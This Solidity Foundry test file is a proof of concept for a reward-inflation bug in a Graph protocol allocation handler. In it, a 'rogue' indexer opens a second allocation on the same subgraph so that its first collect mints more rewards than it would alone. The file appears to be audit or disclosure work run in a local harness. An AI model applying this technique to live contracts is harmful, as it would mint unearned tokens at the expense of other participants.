// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.27;

import { IGraphPayments } from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

import { RealRewardsHarness } from "../harness/RealRewardsHarness.t.sol";

/// @title PoC — allocate() updates rewards index before incrementing subgraph allocated tokens
/// @notice Mirror of resize-down bug on the allocate (increase) path in AllocationHandler.allocate().
contract IndexingRewardsAllocateInflationPoC is RealRewardsHarness {
    uint256 internal constant PROVISION = MINIMUM_PROVISION_TOKENS * 10;

    function test_PoC_SecondAllocOpen_InflatesFirstCollectVsSolo() public {
        if (!realRmAvailable) {
            vm.skip(true, "RewardsManager artifact missing");
            return;
        }

        uint256 soloMint = _firstCollectAfterBlocks(200, false);
        uint256 twinMint = _firstCollectAfterBlocks(200, true);

        emit log_named_uint("soloFirstCollect", soloMint);
        emit log_named_uint("twinFirstCollect", twinMint);

        assertGt(soloMint, 0);
        assertGt(twinMint, soloMint, "opening 2nd allocation inflates 1st collect vs solo baseline");
    }

    function test_PoC_TwinFirstCollect_ExceedsFairHalfOfSolo() public {
        if (!realRmAvailable) {
            vm.skip(true, "RewardsManager artifact missing");
            return;
        }

        uint256 solo = _firstCollectAfterBlocks(200, false);
        uint256 twin = _firstCollectAfterBlocks(200, true);
        uint256 fairHalf = solo / 2;

        emit log_named_uint("solo", solo);
        emit log_named_uint("twinFirstAlloc", twin);
        emit log_named_uint("fairHalf", fairHalf);

        assertGt(twin, fairHalf + (fairHalf / 4), "twin first collect > fair 2-alloc share (~>1.25x half)");
    }

    function _firstCollectAfterBlocks(uint256 blocks, bool openSecondAlloc) internal returns (uint256 mint) {
        bytes32 subgraph = keccak256(abi.encodePacked("alloc-poc-", openSecondAlloc, blocks));
        address rogue = makeAddr(string.concat("rogue-", vm.toString(openSecondAlloc)));

        IndexerSetup memory first = _startAlloc(rogue, subgraph, PROVISION, "first");
        vm.roll(block.number + blocks);

        if (openSecondAlloc) {
            _startAlloc(rogue, subgraph, PROVISION, "second");
        }

        uint256 before = token.totalSupply();
        _collect(first);
        mint = token.totalSupply() - before;
    }

    function _startAlloc(
        address indexer,
        bytes32 subgraph,
        uint256 provision,
        string memory label
    ) internal returns (IndexerSetup memory ix) {
        (string memory url,) = subgraphService.indexers(indexer);
        if (bytes(url).length == 0) {
            _mintTokens(indexer, provision * 3);
            vm.startPrank(indexer);
            token.approve(address(staking), provision * 3);
            staking.stakeTo(indexer, provision * 3);
            staking.provision(indexer, address(subgraphService), provision, FISHERMAN_REWARD_PERCENTAGE, DISPUTE_PERIOD);
            subgraphService.register(indexer, abi.encode("url", "geoHash", address(0)));
            subgraphService.setPaymentsDestination(indexer);
            vm.stopPrank();
        } else {
            _mintTokens(indexer, provision);
            vm.startPrank(indexer);
            token.approve(address(staking), provision);
            staking.stakeTo(indexer, provision);
            staking.addToProvision(indexer, address(subgraphService), provision);
            vm.stopPrank();
        }

        (ix.allocationId, ix.allocationKey) = makeAddrAndKey(string.concat("poc-", label, "-", vm.toString(subgraph)));
        ix.addr = indexer;
        ix.subgraphDeploymentId = subgraph;
        ix.provisionTokens = provision;

        bytes32 digest = subgraphService.encodeAllocationProof(indexer, ix.allocationId);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ix.allocationKey, digest);
        bytes memory data = abi.encode(subgraph, provision, ix.allocationId, abi.encodePacked(r, s, v));
        vm.prank(indexer);
        subgraphService.startService(indexer, data);
    }

    function _collect(IndexerSetup memory ix) internal {
        bytes memory data = abi.encode(ix.allocationId, bytes32("POI"), _poiMetadata());
        vm.prank(ix.addr);
        subgraphService.collect(ix.addr, IGraphPayments.PaymentTypes.IndexingRewards, data);
    }

    function _poiMetadata() internal view returns (bytes memory) {
        // forge-lint: disable-next-line(unsafe-typecast)
        return abi.encode(block.number, bytes32("PUBLIC_POI"), uint8(0), uint8(0), uint256(0));
    }
}
